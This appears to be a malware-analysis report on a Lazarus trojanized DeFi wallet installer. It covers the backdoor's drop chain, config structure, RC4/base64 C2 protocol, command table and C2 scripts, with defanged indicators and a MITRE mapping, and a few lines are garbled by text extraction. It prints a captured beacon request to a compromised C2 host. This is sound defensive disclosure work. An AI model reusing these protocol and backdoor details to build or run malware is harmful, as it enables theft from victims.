As the\nprice of cryptocurrency surges, and the popularity of non-fungible token (NFT) and decentralized finance (DeFi) businesses continues to swell,\nthe Lazarus group’s targeting of the financial industry keeps evolving.\n\nWe recently discovered a Trojanized DeFi application that was compiled in November 2021. This application contains a legitimate program\ncalled DeFi Wallet that saves and manages a cryptocurrency wallet, but also implants a malicious file when executed. This malware is a fullfeatured backdoor containing sufficient capabilities to control the compromised victim. After looking into the functionalities of this backdoor, we\ndiscovered numerous overlaps with other tools used by the Lazarus group.\n\nThe malware operator exclusively used compromised web servers located in South Korea for this attack. To take over the servers, we worked\n[closely with the KrCERT and, as a result of this effort, we had an opportunity to investigate a Lazarus group C2 server. The threat actor](https://www.krcert.or.kr/main.do)\nconfigured this infrastructure with servers set up as multiple stages. The first stage is the source for the backdoor while the goal of the second\nstage servers is to communicate with the implants. This is a common scheme used in Lazarus infrastructure.\n\n## Background\n\nIn the middle of December 2021, we noticed a suspicious file uploaded to VirusTotal. At first glance, it looked like a legitimate application\nrelated to decentralized finance (DeFi); however, looking closer we found it initiating an infection scheme. When executed, the app drops both\na malicious file and an installer for a legitimate application, launching the malware with the created Trojanized installer path. Then, the\nspawned malware overwrites the legitimate application with the Trojanized application. Through this process, the Trojanized application gets\nremoved from the disk, allowing it to cover its tracks.\n\n\n-----\n\n**_Infection timeline_**\n\n## Initial infection\n\n[While it’s still unclear how the threat actor tricked the victim into executing the Trojanized application (0b9f4612cdfe763b3d8c8a956157474a),](https://opentip.kaspersky.com/0b9f4612cdfe763b3d8c8a956157474a/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nwe suspect they sent a spear-phishing email or contacted the victim through social media. The hitherto unknown infection procedure starts\nwith the Trojanized application. This installation package is disguised as a DeFi Wallet program containing a legitimate binary repackaged with\nthe installer.\n\nUpon execution, it acquires the next stage malware path (C:\\ProgramData\\Microsoft\\GoogleChrome.exe) and decrypts it with a one-byte XOR\n(Key: 0x5D). In the process of creating this next malware stage, the installer writes the first eight bytes including the ‘MZ’ header to the file\nGoogleChrome.exe and pushes the remaining 71,164 bytes from the data section of the Trojanized application. Next, the malware loads the\nresource CITRIX_MEETINGS from its body and saves it to the path C:\\ProgramData\\Microsoft\\CM202025.exe. The resulting file is a legitimate\nDeFi Wallet application. Eventually, it executes the previously created malware with its file name as a parameter:\n\nC:\\ProgramData\\Microsoft\\GoogleChrome.exe “[current file name]”\n\n**_Malware creation diagram_**\n\n## Backdoor creation\n\n[The malware (d65509f10b432f9bbeacfc39a3506e23) generated by the above Trojanized application is disguised as a benign instance of the](https://opentip.kaspersky.com/d65509f10b432f9bbeacfc39a3506e23/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nGoogle Chrome browser. Upon launch, the malware checks if it was provided with one argument before attempting to copy the legitimate\napplication “C:\\ProgramData\\Microsoft\\CM202025.exe” to the path given as the command line parameter, which means overwriting the original\nTrojanized installer, almost certainly in an attempt to conceal its prior existence. Next, the malware executes the legitimate file to deceive the\nvictim by showing its benign installation process. When the user executes the newly installed program, it shows the DeFi Wallet software built\nwith the public source code[1].\n\n\n-----\n\n**_Screenshot of the manipulated application_**\n\nNext, the malware starts initializing the configuration information. The configuration shows the structure shown in the table below, consisting of\nflags, C2 server addresses, victim identification value, and time value. As the structure suggests, this malware can hold up to five C2\naddresses, but only three C2 servers are included in this case.\n\n**Offset** **Length(bytes)** **Description**\n\n0x00 4 Flag for starting C2 operation\n\n0x04 4 Random value to select C2 server\n\n0x08 4 Random value for victim identifier\n\n0x0C 0x208 C2 server address\n\n0x214 0x208 C2 server address\n\n0x41C 0x208 C2 server address\n\n0x624 0x208 C2 server address\n\n0x82C 0x208 C2 server address\n\n0xA34 0x464 Buffer for system information\n\n0xE98 0x400 Full cmd.exe path\n\n0x1298 0x400 Temporary folder path\n\n0x1698 8 Time to start backdoor operation\n\n0x16A0 4 Time interval\n\n0x16A4 4 Flag for gathering logical drives\n\n0x16A8 8 Flag for enumerating session information\n\n0x16B0 8 The time value for gathering logical drive and session information\n\n\n-----\n\ne a a e a do y c ooses a C se e add ess a d se ds a beaco s g a to t s s g a s a a d coded 0 60 9 9 O\nwithout encryption; the response data returned from the C2 carries the same value. If the expected value from the C2 server is received, the\nmalware starts its backdoor operation.\n\nFollowing further communication with the C2, the malware encrypts data by a predefined method. The encryption is done via RC4 and the\nhard-coded key 0xD5A3 before additionally being encoded with base64.\n\nThe malware generates POST parameters with hard-coded names. The request type (msgID), victim identification value, and a randomly\ngenerated value are merged into the ‘jsessid’ parameter. It also uses the ‘cookie’ parameter to store four randomly generated four-byte values.\nThese values are again encrypted with RC4 and additionally base64 encoded. Based on our investigation of the C2 script, we observed this\nmalware not only uses a parameter named ‘jsessid’, but also ‘jcookie’ as well.\n\n**_Structure of ‘jsessid’ parameter_**\n\nThe following HTTP request shows the malware attempting to connect to the C2 with the request type ’60d49d98′ and a randomly generated\ncookie value.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\nPOST /include/inc.asp HTTP/1.1\n\nContent-Type: application/x-www-form-urlencoded\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR\n3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)\n\nHost: emsystec.com\n\nContent-Length: 80\n\nCache-Control: no-cache\n\njsessid=60d49d980163be8f00019f91&cookie=29f23f917ab01aa8lJ3UYA==2517757b7dfb47f1\n\n\nDepending on the response from the C2, the malware performs its instructed backdoor task. It carries various functionalities to gather system\ninformation and control the victim machine.\n\n**Command** **Description**\n\n0x60D49D97 Set time configuration with the current time interval (default is 10) value\n\n0x60D49D9F Set time configuration with delivered data from C2 server\n\n0x60D49DA0 Gather system information, such as IP address, computer name, OS version, CPU architecture\n\n0x60D49DA1 Collect drive information including type and free size\n\n0x60D49DA2 Enumerate files (with file name, size, time)\n\n0x60D49DA3 Enumerate processes\n\n0x60D49DA4 Terminate process\n\n0x60D49DA5 Change working directory\n\n0x60D49DA6 Connect to a given IP address\n\n\n-----\n\n0x60D49DA7 File timestamping\n\n0x60D49DA8 Execute Windows command\n\n0x60D49DA9 Securely delete a file\n\n0x60D49DAA Spawn process with CreateProcessW API\n\n0x60D49DAB Spawn process with CreateProcessAsUserW API\n\n0x60D49DAC Spawn process with high integrity level\n\n0x60D49DAD Download file from C2 server and save to given file path\n\n0x60D49DAE Send file creation time and contents\n\n0x60D49DAF Add files to .cab file and send it to the C2 server\n\n0x60D49DB0 Collect a list of files at the given path\n\n0x60D49DB1 Send the configuration to the C2 server\n\n0x60D49DB2 Receive new configuration from the C2 server\n\n0x60D49DB3 Set config to the current time\n\n0x60D49DB4 Sleep 0.1 seconds and continue\n\n## Infrastructure\n\n[Lazarus only used compromised web servers located in South Korea in this campaign. As a result of working closely with the KrCERT in taking](https://www.krcert.or.kr/main.do)\ndown some of them, we had a chance to look into the corresponding C2 script from one of the compromised servers. The script described in\nthis section was discovered in the following path:\n\n1 http://bn-cosmo[.]com/customer/board_replay[.]asp\n\nThe script is a VBScript.Encode ASP file, commonly used by the Lazarus group in their C2 scripts. After decoding, it shows the string\n’60d49d95′ as an error response code, whereas the string ’60d49d94′ is used as a success message. In addition, the connection history is\nsaved to the file ‘stlogo.jpg‘ and the C2 address for the next stage is stored in the file ‘globals.jpg‘ located in the same folder.\n\n**_Configuration of C2 script_**\n\nThis script checks what value is delivered in the ‘jcookie’ parameter and, if it’s longer than 24 characters, it extracts the first eight characters as\nmsgID. Depending on the msgID value, it calls different functions. The backdoor command and command execution result delivered by the\nbackdoor get stored to global variables. We have seen this scheme in operation before with the Bookcode[2] cluster. This script uses the\nfollowing variables as flags and buffers to deliver data and commands between the backdoor and a second stage C2 server:\n\nlFlag: flag to signal that there is data to deliver to the backdoor\nlBuffer: buffer to store data to be later sent to the backdoor\ntFlag: flag to signal that there is a response from the backdoor\ntBuffer: buffer to store incoming data from the backdoor\n\n\n**msgID** **Function**\n**name**\n\n\n**Description**\n\n\n60d49d98 TFConnect Save the ‘TID’ value (victim identifier) to the log file, send ‘jcookie’ value with the client’s IP address after acquiring\nthe next stage C2 address from the config file (globals.jpg). Forward the response from the next stage server to\nthe client.\n\n\n-----\n\n60d49d99 TConnect Deliver the command to the backdoor:\nIf the lFlag is ‘true’, send lBuffer to the client. Reset ‘lBuffer’ and set lFlag to ‘false’. Otherwise, reset ‘tBuffer’ and\nset tFlag to ‘false’.\n\n60d49d9a LConnect Send the command and return the command execution result:\nSet ‘ lBuffer’ value to ‘jcookie’ parameter, delivering ‘tBuffer’ to the client.\n\n60d49d9c Check Retrieve host information (computer name, OS version). Delete the configuration file, which saves the C2’s next\nstage address, if it exists. Then save the new configuration with delivered data through the ‘jcookie’ parameter.\n\n60d49d9d LogDown Deliver log file after base64 encoding and then delete it.\n\nthe others N/A Write connections with unknown/unexpected msgID (request type) data to a log file, entries are tagged with\n_‘xxxxxxxx’._\n\n## Attribution\n\nWe believe with high confidence that the Lazarus group is linked to this malware as we identified similar malware in the CookieTime cluster.\n[The CookieTime cluster, called LCPDot by JPCERT, was a malware cluster that was heavily used by the Lazarus group until recently. We’ve](https://blogs.jpcert.or.jp/en/2021/01/Lazarus_malware2.html)\nseen Lazarus group target the defence industry using the CookieTime cluster with a job opportunity decoy. We have already published several\nreports about this cluster to our Threat Intelligence Service customers, and we identified a Trojanized Citrix application\n[(5b831eaed711d5c4bc19d7e75fcaf46e) with the same code signature as the CookieTime malware. The backdoor discovered in the latest](https://opentip.kaspersky.com/5b831eaed711d5c4bc19d7e75fcaf46e/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\ninvestigation, and the previously discovered Trojanized application, are almost identical. They share, among other things, the same C2\ncommunication method, backdoor functionalities, random number generation routine and the same method to encrypt communication data.\n[Also, this malware was mentioned in an article by Ahnlab discussing connections with the CookieTime (aka LCPDot) malware.](https://cn.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.102_ENG%20(4).pdf)\n\n**_Same backdoor switch of old CookieTime malware_**\n\nIn turn, we identified that the CookieTime cluster has ties with the Manuscrypt and ThreatNeedle clusters, which are also attributed to the\nLazarus group. This doesn’t only apply to the backdoor itself, but also to the C2 scripts, which show several overlaps with the ThreatNeedle\ncluster. We discovered almost all function and variable names, which means the operators recycled the code base and generated\ncorresponding C2 scripts for the malware.\n\n\n**ThreatNeedle C2 script from**\n\nroit.co[.]kr/xyz/adminer/edit_fail_decoded.asp\n\n\n**C2 script of this case**\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nfunctIon getIpAddress()\n\nOn ErroR resume next\n\nDim ip\n\nip=Request.SErVervariables(\"HTTP_CLIENT_IP\")\n\nIf ip=\"\"THen\n\nIp=ReQUest.ServervaRiAbLes(\"HTTP_X_FORWARDED_FOR\")\n\nIf ip=\"\"ThEn\n\nip=request.ServerVaRiables(\"REMOTE_ADDR\")\n\nEnd If\n\nEnd if\n\nGEtIpAdDress=ip\n\nEnd FuNction\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nfUnctioN GetIpAddress()\n\nON Error Resume Next\n\nDim iP\n\nip=ReqUest.ServerVaRiables(\"HTTP_CLIENT_IP\")\n\nIf ip=\"\"THEn\n\niP=Request.SErverVariaBleS(\"HTTP_X_FORWARDED_FOR\")\n\nIf ip=\"\"then\n\nip=reQuest.ServErVariables(\"REMOTE_ADDR\")\n\nEnD IF\n\nEnD If\n\nGEtipAddreSs=ip\n\nEnd FUnction\n\n\n**_Almost identical scripts to fetch IP address of client_**\n\n\n**ThreatNeedle C2 script from:**\n\nedujikim[.]com/pay_sample/INIstart.asp\n\n\n**C2 script of this case**\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n\nSub writeDataToFile(strFileName, byData)\n\nDim objFSO, objFile, strFilePath\n\nConst ForAppending = 8\n\nstrFilePath = Server.MapPath(\".\") & \"\\\" &\n\nstrFileName\n\nSet objFSO =\n\nCreateObject(\"Scripting.FileSystemObject\")\n\nSet objFile =\n\nobjFSO.OpenTextFile(strFilePath,\n\nForAppending, True)\n\nobjFile.Write byData\n\nobjFile.Close\n\nEnd Sub\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\nSub WritedatA(filepath,byData)\n\ndim objFSO,oBJFile\n\nConSt ForAppEnDing=8\n\nSet\n\nobjFsO=CreateObject(\"Scripting.FileSystemObject\")\n\nSeT\n\nobjFIle=objFso.OpENTextFile(filepaTh,FoRAppending,True)\n\nobjFilE.Write ByDatA\n\nobjFIle.CLose\n\nEnD Sub\n\n\n**_Similar scripts to save data to a file_**\n\n## Conclusions\n\n[In a previous investigation we discovered that the BlueNoroff group, which is also linked to Lazarus, compromised another DeFi wallet](https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/)\nprogram called MetaMask. As we can see in the latest case, the Lazarus and BlueNoroff groups attempt to deliver their malware without\ndrawing attention to it and have evolved sophisticated methods to lure their victims. The cryptocurrency and blockchain-based industry\ncontinues to grow and attract high levels of investment. For this reason, we strongly believe Lazarus’s interest in this industry as a major\nsource of financial gain will not diminish any time soon.\n\n## Indicators of Compromise\n\n\n-----\n\n**oja** **ed** **e** **app cat o**\n[0b9f4612cdfe763b3d8c8a956157474a  DeFi-App.exe](https://opentip.kaspersky.com/0b9f4612cdfe763b3d8c8a956157474a/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Dropped backdoor**\n[d65509f10b432f9bbeacfc39a3506e23  %ProgramData%\\Microsoft\\GoogleChrome.exe](https://opentip.kaspersky.com/d65509f10b432f9bbeacfc39a3506e23/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Similar backdoor**\n[a4873ef95e6d76856aa9a43d56f639a4](https://opentip.kaspersky.com/a4873ef95e6d76856aa9a43d56f639a4/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[d35a9babbd9589694deb4e87db222606](https://opentip.kaspersky.com/d35a9babbd9589694deb4e87db222606/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[70bcafbb1939e45b841e68576a320603](https://opentip.kaspersky.com/70bcafbb1939e45b841e68576a320603/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[3f4cf1a8a16e48a866aebd5697ec107b](https://opentip.kaspersky.com/3f4cf1a8a16e48a866aebd5697ec107b/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[b7092df99ece1cdb458259e0408983c7](https://opentip.kaspersky.com/b7092df99ece1cdb458259e0408983c7/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[8e302b5747ff1dcad301c136e9acb4b0](https://opentip.kaspersky.com/8e302b5747ff1dcad301c136e9acb4b0/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[d90d267f81f108a89ad728b7ece38e70](https://opentip.kaspersky.com/d90d267f81f108a89ad728b7ece38e70/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[47b73a47e26ba18f0dba217cb47c1e16](https://opentip.kaspersky.com/47b73a47e26ba18f0dba217cb47c1e16/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[77ff51bfce3f018821e343c04c698c0e](https://opentip.kaspersky.com/77ff51bfce3f018821e343c04c698c0e/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**First stage C2 servers (Legitimate, compromised)**\nhxxp://emsystec[.]com/include/inc[.]asp\nhxxp://www[.]gyro3d[.]com/common/faq[.]asp\nhxxp://www[.]newbusantour[.]co[.]kr/gallery/left[.]asp\nhxxp://ilovesvc[.]com/HomePage1/Inquiry/privacy[.]asp\nhxxp://www[.]syadplus[.]com/search/search_00[.]asp\nhxxp://bn-cosmo[.]com/customer/board_replay[.]asp\n\n**Second stage C2 servers (Legitimate, compromised)**\nhxxp://softapp[.]co[.]kr/sub/cscenter/privacy[.]asp\nhxxp://gyro3d[.]com/mypage/faq[.]asp\n\n## MITRE ATT&CK Mapping\n\nThis table contains all the TTPs identified in the analysis of the activity described in this report.\n\n**Tactic** **Technique** **Technique Name**\n\n**Execution** **T1204.002** **User Execution: Malicious File**\n\nUse Trojanized application to drop malicious backdoor\n\n**Persistence** **T1547.001** **Boot or Logon Autostart Execution: Registry Run Keys /**\n**Startup Folder**\n\nRegister dropped backdoor to the Run registry key\n\n\n**Defense**\n**Evasion**\n\n\n**T1070.004** **Indicator Removal on Host: File Deletion**\n\nThe Trojanized application overwrites itself after creating a\nlegitimate application to remove its trace\n\n\n**T1070.006** **Indicator Removal on Host: Timestomp**\n\nBackdoor capable of timestomping specific files\n\n**Discovery** **T1057** **Process Discovery**\n\nList running processes with backdoor\n\n**T1082** **System Information Discovery**\n\nGather IP address, computer name, OS version, and\nCPU architecture with backdoor\n\n**T1083** **File and Directory Discovery**\n\nList files in some directories with backdoor\n\n**T1124** **System Time Discovery**\n\nGather system information with backdoor\n\n\n**Command**\n**and Control**\n\n\n**T1071.001** **Application Layer Protocol: Web Protocols**\n\nUse HTTP as C2 channel with backdoor\n\n\n**T1573.001** **Encrypted Channel: Symmetric Cryptography**\n\nUse RC4 encryption and base64 with backdoor\n\n**Exfiltration** **T1041** **Exfiltration Over C2 Channel**\n\nExfiltrates gathered data over C2 channels with backdoor\n\n\n-----\n\nttps //g t ub co / e C /app\n\n[2] APT Intel report: Lazarus Covet Covid19 Related Intelligence\n\n[Backdoor](https://securelist.com/tag/backdoor/)\n[Financial malware](https://securelist.com/tag/financial-malware/)\n[Google Chrome](https://securelist.com/tag/google-chrome/)\n[Lazarus](https://securelist.com/tag/lazarus/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Trojan](https://securelist.com/tag/trojan/)\n\nAuthors\n\nGReAT\n\nLazarus Trojanized DeFi app for delivering malware\n\nYour email address will not be published.
